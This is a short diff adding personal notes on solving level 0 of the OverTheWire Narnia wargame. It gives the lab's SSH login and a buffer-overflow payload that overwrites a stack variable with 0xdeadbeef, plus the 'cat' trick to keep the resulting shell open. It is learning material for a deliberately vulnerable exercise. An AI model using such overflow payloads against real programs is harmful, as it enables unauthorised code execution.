@@ -1,0 +1,9 @@
+ssh narnia0@narnia.labs.overthewire.org -p 2226
+narnia0
+[buffer overflow]
+[because the stack pointer goes up by one after leaving the last array, we can write into val]
+printf "11111111111111111111\xef\xbe\xad\xde" | ./narnia0
+[but the console instantly closes]
+[solution: add a command that blocks the console]
+(printf "11111111111111111111\xef\xbe\xad\xde"; cat;) | ./narnia0
+
